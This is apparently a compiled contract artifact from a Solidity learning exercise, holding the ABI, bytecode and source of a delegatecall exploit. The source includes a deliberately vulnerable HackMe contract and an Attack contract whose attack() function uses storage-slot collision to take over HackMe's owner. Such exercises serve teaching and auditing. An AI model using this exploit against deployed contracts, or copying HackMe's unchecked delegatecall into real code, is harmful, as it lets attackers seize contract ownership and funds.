{
  "contractName": "Attack",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "contract HackMe",
          "name": "_hackMe",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attacker",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "hackMe",
      "outputs": [
        {
          "internalType": "contract HackMe",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "lib",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "someNumber",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_num",
          "type": "uint256"
        }
      ],
      "name": "doSomething",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561000f575f80fd5b5060405161065d38038061065d83398181016040528101906100319190610126565b8060045f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055503360035f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610151565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100e4826100bb565b9050919050565b5f6100f5826100da565b9050919050565b610105816100eb565b811461010f575f80fd5b50565b5f81519050610120816100fc565b92915050565b5f6020828403121561013b5761013a6100b7565b5b5f61014884828501610112565b91505092915050565b6104ff8061015e5f395ff3fe608060405234801561000f575f80fd5b506004361061007b575f3560e01c8063928012301161005957806392801230146100d9578063931c9b99146100f75780639e5faafc14610115578063a6b206bf1461011f5761007b565b806348eb76ee1461007f57806375efcec51461009d5780638da5cb5b146100bb575b5f80fd5b61008761013b565b60405161009491906103b2565b60405180910390f35b6100a5610160565b6040516100b29190610426565b60405180910390f35b6100c3610185565b6040516100d091906103b2565b60405180910390f35b6100e16101aa565b6040516100ee91906103b2565b60405180910390f35b6100ff6101cd565b60405161010c9190610457565b60405180910390f35b61011d6101d3565b005b6101396004803603810190610134919061049e565b610330565b005b60035f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60045f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60025481565b60045f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a6b206bf3073ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b81526004016102439190610457565b5f604051808303815f87803b15801561025a575f80fd5b505af115801561026c573d5f803e3d5ffd5b5050505060045f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a6b206bf60035f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b81526004016103019190610457565b5f604051808303815f87803b158015610318575f80fd5b505af115801561032a573d5f803e3d5ffd5b50505050565b8060015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61039c82610373565b9050919050565b6103ac81610392565b82525050565b5f6020820190506103c55f8301846103a3565b92915050565b5f819050919050565b5f6103ee6103e96103e484610373565b6103cb565b610373565b9050919050565b5f6103ff826103d4565b9050919050565b5f610410826103f5565b9050919050565b61042081610406565b82525050565b5f6020820190506104395f830184610417565b92915050565b5f819050919050565b6104518161043f565b82525050565b5f60208201905061046a5f830184610448565b92915050565b5f80fd5b61047d8161043f565b8114610487575f80fd5b50565b5f8135905061049881610474565b92915050565b5f602082840312156104b3576104b2610470565b5b5f6104c08482850161048a565b9150509291505056fea264697066735822122034b9dfe7dae2bde211527fb5f70d6a9563ebbc953324962dc02c6ebdc89bd00d64736f6c63430008150033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.13;\r\n\r\ncontract Lib {\r\n    uint public someNumber;\r\n\r\n\r\n    function doSomething(uint _num) public {\r\n        someNumber = _num;\r\n    }\r\n}\r\n\r\n\r\ncontract HackMe {\r\n    address public lib;\r\n    address public owner;\r\n    uint public someNumber;\r\n\r\n\r\n    constructor(address _lib) {\r\n        lib = _lib;\r\n        owner = msg.sender;\r\n    }\r\n\r\n\r\n    function doSomething(uint _num) public {\r\n        (bool rent, ) = lib.delegatecall(abi.encodeWithSignature(\"doSomething(uint256)\", _num));\r\n        require(rent, \"Failed to invoke HackMe.doSomething!\");\r\n    }\r\n}\r\n\r\ncontract Attack {\r\n\r\n    address public lib;\r\n    address public owner;\r\n    uint public someNumber;\r\n    address public attacker;\r\n\r\n\r\n    HackMe public hackMe;\r\n\r\n\r\n    constructor(HackMe _hackMe) {\r\n        hackMe = HackMe(_hackMe);\r\n        attacker = msg.sender;\r\n    }\r\n\r\n\r\n    function attack() public {\r\n        hackMe.doSomething(uint(uint160(address(this))));\r\n\r\n        hackMe.doSomething(uint(uint160(attacker)));\r\n    }\r\n\r\n    function doSomething(uint _num) public {\r\n        owner = address(uint160(_num));\r\n    }\r\n}",
  "sourcePath": "D:\\workPlace\\\\9\\\\Attack\\DelegateCall\\contracts\\HackMe.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.21+commit.d9974bed.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2023-09-12T07:59:03.679Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}